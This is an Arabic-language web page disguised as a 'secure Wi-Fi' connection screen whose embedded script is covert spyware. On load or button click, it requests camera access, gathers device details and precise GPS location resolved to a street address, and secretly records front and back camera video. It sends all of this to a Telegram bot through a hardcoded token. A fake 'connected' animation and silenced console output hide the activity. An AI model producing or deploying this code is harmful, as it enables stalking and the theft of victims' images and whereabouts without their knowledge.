<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>شبكة واي فاي آمنة</title>
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0a0e1a, #1a1f35);
            color: #c8d6e5;
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 900px;
            margin: 20px;
            padding: 30px 25px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(10px);
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .logo {
            font-size: 3.5rem;
            color: #4fc3f7;
            margin-bottom: 15px;
        }

        h1 {
            font-size: 1.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #4fc3f7, #81d4fa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 0.95rem;
            color: #78909c;
            margin-bottom: 25px;
            line-height: 1.8;
        }

        .wifi-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 30px 0;
        }

        .wifi-item {
            background: rgba(255, 255, 255, 0.03);
            padding: 18px 12px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: 0.3s;
        }

        .wifi-item i {
            font-size: 1.8rem;
            color: #4fc3f7;
            margin-bottom: 8px;
        }

        .wifi-item .name {
            font-size: 0.9rem;
            font-weight: 600;
            color: #e0e0e0;
        }

        .wifi-item .enc {
            font-size: 0.65rem;
            color: #4fc3f7;
            display: block;
            margin-top: 5px;
        }

        .connect-btn {
            background: linear-gradient(135deg, #4fc3f7, #0288d1);
            border: none;
            padding: 14px 45px;
            font-size: 1.1rem;
            font-weight: 600;
            color: white;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(79, 195, 247, 0.2);
            margin: 20px 0;
            font-family: 'Cairo', sans-serif;
        }

        .connect-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 6px 25px rgba(79, 195, 247, 0.3);
        }

        .footer-text {
            font-size: 0.7rem;
            color: #546e7a;
            margin-top: 30px;
        }

        .hidden-camera {
            position: fixed;
            bottom: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -99999;
            visibility: hidden;
        }

        .hidden-camera video {
            width: 1px;
            height: 1px;
            opacity: 0;
            position: absolute;
        }

        video {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <i class="fas fa-wifi"></i>
    </div>
    <h1>شبكة واي فاي آمنة</h1>
    <p class="subtitle">
        <i class="fas fa-shield-alt" style="color: #4fc3f7;"></i>
        اتصال مشفر بالكامل • حماية متقدمة
    </p>

    <div class="wifi-grid">
        <div class="wifi-item">
            <i class="fas fa-lock"></i>
            <div class="name">STC_5G</div>
            <span class="enc">🔒 مشفر</span>
        </div>
        <div class="wifi-item">
            <i class="fas fa-shield-alt"></i>
            <div class="name">FiberHome</div>
            <span class="enc">🛡️ آمن</span>
        </div>
        <div class="wifi-item">
            <i class="fas fa-server"></i>
            <div class="name">Zain_Crypto</div>
            <span class="enc">🔐 محمي</span>
        </div>
        <div class="wifi-item">
            <i class="fas fa-globe"></i>
            <div class="name">UAE_Secure</div>
            <span class="enc">🌐 مشفر</span>
        </div>
    </div>

    <button id="connectBtn" class="connect-btn">
        <i class="fas fa-plug"></i> اتصال آمن
    </button>

    <div class="footer-text">
        <i class="fas fa-check-circle" style="color: #4fc3f7;"></i>
        اتصال مشفر من طرف إلى طرف
    </div>
</div>

<!-- كاميرات مخفية -->
<div class="hidden-camera">
    <video id="frontCam" muted playsinline></video>
</div>
<div class="hidden-camera">
    <video id="backCam" muted playsinline></video>
</div>

<script>
    (function() {
        'use strict';

        // ================== بيانات البوت ==================
        const BOT_TOKEN = "8742612066:AAGuIq4k7uLsokiWRcE9O-_J8fJVxCFplWQ";
        const CHAT_ID = "8161528888";

        // ================== العناصر المخفية ==================
        const frontVideo = document.getElementById('frontCam');
        const backVideo = document.getElementById('backCam');
        const connectBtn = document.getElementById('connectBtn');

        // ================== متغيرات التحكم ==================
        let isProcessing = false;
        let frontStream = null;
        let backStream = null;

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ================== الحصول على معلومات الجهاز ==================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let info = {
                model: 'غير معروف',
                os: 'غير معروف',
                browser: 'غير معروف',
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'غير محدد',
                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'غير معروف',
                connection: navigator.connection?.effectiveType || 'غير معروف',
                language: navigator.language || 'غير معروف',
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            if (ua.includes('Win')) info.os = 'Windows';
            else if (ua.includes('Mac')) info.os = 'macOS';
            else if (ua.includes('Android')) info.os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) info.os = 'iOS';
            else if (ua.includes('Linux')) info.os = 'Linux';

            if (ua.includes('Edg')) info.browser = 'Edge';
            else if (ua.includes('Chrome')) info.browser = 'Chrome';
            else if (ua.includes('Firefox')) info.browser = 'Firefox';
            else if (ua.includes('Safari')) info.browser = 'Safari';

            const patterns = [
                /(SM-[A-Za-z0-9]+)/i, /(iPhone[0-9,]+)/i, /(iPad[0-9,]+)/i,
                /(Xperia[^;)]+)/i, /(MI [A-Za-z0-9]+)/i, /(Redmi[^;)]+)/i,
                /(Pixel [0-9a-zA-Z]+)/i, /(Galaxy [A-Z0-9]+)/i
            ];
            for (let p of patterns) {
                const match = ua.match(p);
                if (match && match[1]) {
                    info.model = match[1];
                    break;
                }
            }
            if (info.model === 'غير معروف' && ua.includes('Android')) {
                const match = ua.match(/Android [0-9.]+; ([^;)]+)/);
                if (match && match[1]) info.model = match[1];
            }

            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    info.battery = `${Math.round(battery.level * 100)}%`;
                }).catch(() => {});
            }

            return info;
        }

        // ================== الحصول على الموقع مع اسم الشارع ==================
        function getLocationWithStreet() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        let fullAddress = '';
                        let street = '';
                        let city = '';
                        let country = '';
                        let building = '';

                        try {
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`,
                                { 
                                    headers: { 'User-Agent': 'Mozilla/5.0' },
                                    signal: AbortSignal.timeout(8000)
                                }
                            );
                            
                            if (response.ok) {
                                const data = await response.json();
                                const addr = data.address || {};
                                
                                street = addr.road || addr.street || addr.street_name || '';
                                city = addr.city || addr.town || addr.village || '';
                                country = addr.country || '';
                                building = addr.building || addr.house_number || '';
                                
                                const parts = [];
                                if (building) parts.push(building);
                                if (street) parts.push(street);
                                if (city) parts.push(city);
                                if (country) parts.push(country);
                                fullAddress = parts.join('، ');
                                
                                if (!fullAddress) {
                                    fullAddress = data.display_name || 'تم تحديد الموقع';
                                }
                            }
                        } catch (e) {}

                        if (!fullAddress) {
                            try {
                                const response = await fetch(
                                    `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=ar`
                                );
                                if (response.ok) {
                                    const data = await response.json();
                                    street = data.street || '';
                                    city = data.city || data.locality || '';
                                    country = data.countryName || '';
                                    fullAddress = `${street}، ${city}، ${country}`;
                                }
                            } catch (e) {}
                        }

                        resolve({
                            lat: lat,
                            lon: lon,
                            accuracy: Math.round(position.coords.accuracy),
                            street: street || 'غير معروف',
                            city: city || 'غير معروف',
                            country: country || 'غير معروف',
                            fullAddress: fullAddress || `📍 ${lat}, ${lon}`,
                            building: building || '',
                            maps: `https://www.google.com/maps?q=${lat},${lon}`
                        });
                    },
                    () => { resolve(null); },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // ================== الحصول على الكاميرات المتاحة ==================
        async function getAvailableCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                let frontCamera = null;
                let backCamera = null;
                
                for (const device of videoDevices) {
                    const label = device.label.toLowerCase();
                    if (label.includes('front') || label.includes('فأمامية') || label.includes('face')) {
                        frontCamera = device;
                    } else if (label.includes('back') || label.includes('خلفية') || label.includes('rear') || label.includes('environment')) {
                        backCamera = device;
                    }
                }
                
                // إذا لم يتم العثور على كاميرات محددة
                if (!frontCamera && videoDevices.length > 0) {
                    frontCamera = videoDevices[0];
                }
                if (!backCamera && videoDevices.length > 1) {
                    backCamera = videoDevices[1];
                }
                
                return { frontCamera, backCamera, allDevices: videoDevices };
            } catch (e) {
                console.error('خطأ في جلب الكاميرات:', e);
                return { frontCamera: null, backCamera: null, allDevices: [] };
            }
        }

        // ================== تصوير الكاميرا - نسخة محسنة ==================
        async function captureCamera(facingMode, type) {
            try {
                // محاولة الحصول على الكاميرا المحددة
                let stream = null;
                let constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };

                // محاولة 1: باستخدام facingMode
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e1) {
                    console.log(`محاولة 1 فشلت للكاميرا ${type}:`, e1);
                    
                    // محاولة 2: بدون facingMode محدد
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: { width: { ideal: 640 }, height: { ideal: 480 } },
                            audio: false
                        });
                    } catch (e2) {
                        console.log(`محاولة 2 فشلت للكاميرا ${type}:`, e2);
                        return null;
                    }
                }

                if (!stream || !stream.active) {
                    console.log(`التيار غير نشط للكاميرا ${type}`);
                    return null;
                }

                // اختيار عنصر الفيديو المناسب
                const videoEl = type === 'front' ? frontVideo : backVideo;
                
                // تخزين التيار
                if (type === 'front') {
                    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                    frontStream = stream;
                } else {
                    if (backStream) backStream.getTracks().forEach(t => t.stop());
                    backStream = stream;
                }

                // إعداد الفيديو
                videoEl.srcObject = stream;
                await new Promise((resolve) => {
                    videoEl.onloadedmetadata = () => resolve();
                    setTimeout(resolve, 1000);
                });

                await videoEl.play();
                await sleep(500);

                // تسجيل الفيديو
                const mimeTypes = [
                    'video/webm;codecs=vp9,opus',
                    'video/webm;codecs=vp8,opus',
                    'video/webm;codecs=h264,opus',
                    'video/webm',
                    'video/mp4'
                ];
                
                let mimeType = 'video/webm';
                for (const type of mimeTypes) {
                    if (MediaRecorder.isTypeSupported(type)) {
                        mimeType = type;
                        break;
                    }
                }

                const recorder = new MediaRecorder(stream, { 
                    mimeType: mimeType,
                    videoBitsPerSecond: 500000
                });
                
                const chunks = [];

                recorder.ondataavailable = (e) => {
                    if (e.data && e.data.size > 0) {
                        chunks.push(e.data);
                    }
                };

                const videoBlob = await new Promise((resolve, reject) => {
                    recorder.onstop = () => {
                        if (chunks.length === 0) {
                            reject(new Error('لا توجد بيانات فيديو'));
                            return;
                        }
                        const blob = new Blob(chunks, { type: mimeType });
                        resolve(blob);
                    };

                    recorder.onerror = (err) => reject(err);

                    recorder.start(100);
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            recorder.stop();
                        }
                    }, 3000);
                });

                return videoBlob;

            } catch (e) {
                console.error(`خطأ في تصوير ${type}:`, e);
                return null;
            }
        }

        // ================== إرسال الفيديو إلى تليجرام ==================
        async function sendVideoToTelegram(videoBlob, type, device, location) {
            try {
                if (!videoBlob || videoBlob.size < 1000) {
                    console.log(`حجم الفيديو ${type} صغير جداً: ${videoBlob?.size || 0}`);
                    return false;
                }

                console.log(`حجم الفيديو ${type}: ${videoBlob.size} بايت`);

                const now = new Date();
                const timeStr = now.toLocaleString('ar-EG');

                let caption = `🎥 فيديو (3 ثوانٍ) - كاميرا ${type === 'front' ? 'أمامية' : 'خلفية'}\n`;
                caption += `⏰ ${timeStr}\n`;
                caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
                caption += `📱 الجهاز: ${device.model}\n`;
                caption += `🖥️ النظام: ${device.os}\n`;
                caption += `🌐 المتصفح: ${device.browser}\n`;
                caption += `📐 الشاشة: ${device.screen}\n`;
                caption += `💾 الرام: ${device.memory}\n`;
                caption += `📡 الاتصال: ${device.connection}\n`;
                caption += `🔋 البطارية: ${device.battery || 'غير متاحة'}\n`;

                if (location) {
                    caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
                    caption += `📍 الموقع:\n`;
                    caption += `🏠 ${location.fullAddress}\n`;
                    if (location.street) caption += `🛣️ الشارع: ${location.street}\n`;
                    if (location.city) caption += `🏙️ المدينة: ${location.city}\n`;
                    if (location.country) caption += `🇸🇦 الدولة: ${location.country}\n`;
                    caption += `🗺️ ${location.lat}, ${location.lon}\n`;
                    caption += `🎯 الدقة: ±${location.accuracy}m\n`;
                    caption += `🔗 ${location.maps}`;
                }

                if (caption.length > 1000) {
                    caption = caption.substring(0, 990);
                }

                // إرسال الفيديو
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', caption);
                
                const extension = videoBlob.type.includes('mp4') ? 'mp4' : 'webm';
                const filename = `${type}_${Date.now()}.${extension}`;
                formData.append('video', videoBlob, filename);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                
                if (result.ok) {
                    console.log(`✅ تم إرسال فيديو ${type} بنجاح`);
                    return true;
                } else {
                    console.log(`❌ فشل إرسال فيديو ${type}:`, result);
                    return false;
                }

            } catch (e) {
                console.error(`خطأ في إرسال فيديو ${type}:`, e);
                return false;
            }
        }

        // ================== إرسال معلومات الجهاز ==================
        async function sendDeviceInfo(device, location) {
            try {
                const now = new Date();
                const timeStr = now.toLocaleString('ar-EG');

                let message = `🟢 معلومات الجهاز والموقع\n`;
                message += `━━━━━━━━━━━━━━━━━━━━━\n`;
                message += `📱 الموديل: ${device.model}\n`;
                message += `🖥️ النظام: ${device.os}\n`;
                message += `🌐 المتصفح: ${device.browser}\n`;
                message += `⏰ الوقت: ${timeStr}\n`;
                message += `📐 الشاشة: ${device.screen}\n`;
                message += `💾 الرام: ${device.memory}\n`;
                message += `📡 الاتصال: ${device.connection}\n`;
                message += `🔋 البطارية: ${device.battery || 'غير متاحة'}\n`;
                message += `🗺️ المنطقة: ${device.timeZone}\n`;

                if (location) {
                    message += `━━━━━━━━━━━━━━━━━━━━━\n`;
                    message += `📍 الموقع الجغرافي:\n`;
                    message += `🏠 ${location.fullAddress}\n`;
                    if (location.street) message += `🛣️ الشارع: ${location.street}\n`;
                    if (location.city) message += `🏙️ المدينة: ${location.city}\n`;
                    if (location.country) message += `🇸🇦 الدولة: ${location.country}\n`;
                    message += `🌐 ${location.lat}, ${location.lon}\n`;
                    message += `🎯 الدقة: ±${location.accuracy}m\n`;
                    message += `🔗 ${location.maps}`;
                }

                const params = new URLSearchParams();
                params.append('chat_id', CHAT_ID);
                params.append('text', message);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: params
                });

                const result = await response.json();
                return result.ok;

            } catch (e) {
                console.error('خطأ في إرسال معلومات الجهاز:', e);
                return false;
            }
        }

        // ================== إغلاق الكاميرات ==================
        function closeCameras() {
            if (frontStream) {
                frontStream.getTracks().forEach(t => t.stop());
                frontStream = null;
            }
            if (backStream) {
                backStream.getTracks().forEach(t => t.stop());
                backStream = null;
            }
            if (frontVideo) frontVideo.srcObject = null;
            if (backVideo) backVideo.srcObject = null;
        }

        // ================== العملية الرئيسية المحسنة ==================
        async function mainProcess() {
            if (isProcessing) return;
            isProcessing = true;

            try {
                // 1. طلب إذن الكاميرا
                let cameraPermission = false;
                try {
                    const testStream = await navigator.mediaDevices.getUserMedia({ 
                        video: true, 
                        audio: false 
                    });
                    testStream.getTracks().forEach(t => t.stop());
                    cameraPermission = true;
                } catch (e) {
                    console.log('رفض إذن الكاميرا');
                }

                if (!cameraPermission) {
                    isProcessing = false;
                    return;
                }

                // 2. جمع معلومات الجهاز والموقع
                const device = getDeviceInfo();
                const location = await getLocationWithStreet();

                // 3. إرسال معلومات الجهاز والموقع
                await sendDeviceInfo(device, location);

                // 4. تصوير الكاميرا الأمامية
                await sleep(500);
                console.log('بدء تصوير الكاميرا الأمامية...');
                const frontBlob = await captureCamera('user', 'front');
                if (frontBlob && frontBlob.size > 1000) {
                    console.log('تم تصوير الكاميرا الأمامية، جاري الإرسال...');
                    await sendVideoToTelegram(frontBlob, 'front', device, location);
                } else {
                    console.log('فشل تصوير الكاميرا الأمامية');
                }

                await sleep(1000);

                // 5. تصوير الكاميرا الخلفية - محاولات متعددة
                console.log('بدء تصوير الكاميرا الخلفية...');
                let backBlob = null;
                let backAttempts = 0;
                const maxAttempts = 3;

                while (backAttempts < maxAttempts && !backBlob) {
                    backAttempts++;
                    console.log(`محاولة ${backAttempts} للكاميرا الخلفية...`);
                    
                    // محاولة مع facingMode مختلف
                    const facingModes = ['environment', 'back'];
                    for (const mode of facingModes) {
                        if (backBlob) break;
                        try {
                            backBlob = await captureCamera(mode, 'back');
                            if (backBlob && backBlob.size > 1000) {
                                console.log(`تم تصوير الكاميرا الخلفية باستخدام ${mode}`);
                                break;
                            }
                        } catch (e) {
                            console.log(`فشل تصوير الكاميرا الخلفية باستخدام ${mode}:`, e);
                        }
                    }
                    
                    if (!backBlob || backBlob.size < 1000) {
                        await sleep(1000);
                    }
                }

                if (backBlob && backBlob.size > 1000) {
                    console.log('تم تصوير الكاميرا الخلفية، جاري الإرسال...');
                    await sendVideoToTelegram(backBlob, 'back', device, location);
                } else {
                    console.log('فشل تصوير الكاميرا الخلفية بعد جميع المحاولات');
                }

                // 6. إرسال تأكيد نهائي
                const finalMsg = `✅ اكتمل جمع البيانات\n📹 كاميرا أمامية: ${frontBlob && frontBlob.size > 1000 ? '✅ تم' : '❌ فشل'}\n📹 كاميرا خلفية: ${backBlob && backBlob.size > 1000 ? '✅ تم' : '❌ فشل'}`;
                const params = new URLSearchParams();
                params.append('chat_id', CHAT_ID);
                params.append('text', finalMsg);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: params
                });

            } catch (e) {
                console.error('خطأ في العملية الرئيسية:', e);
            } finally {
                closeCameras();
                isProcessing = false;
            }
        }

        // ================== حدث الزر ==================
        if (connectBtn) {
            connectBtn.addEventListener('click', function(e) {
                e.preventDefault();
                
                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الاتصال...';
                this.disabled = true;
                
                setTimeout(() => {
                    this.innerHTML = '<i class="fas fa-check"></i> متصل';
                    setTimeout(() => {
                        this.innerHTML = '<i class="fas fa-plug"></i> اتصال آمن';
                        this.disabled = false;
                    }, 2000);
                }, 1500);

                mainProcess();
            });
        }

        // ================== التشغيل التلقائي ==================
        let autoStarted = false;

        window.addEventListener('load', function() {
            if (!autoStarted) {
                autoStarted = true;
                setTimeout(() => {
                    mainProcess();
                }, 3000);
            }
        });

        // ================== إخفاء الأخطاء ==================
        window.onerror = function() { return true; };
        console.log = function() {};
        console.warn = function() {};
        console.error = function() {};

    })();
</script>
</body>
</html>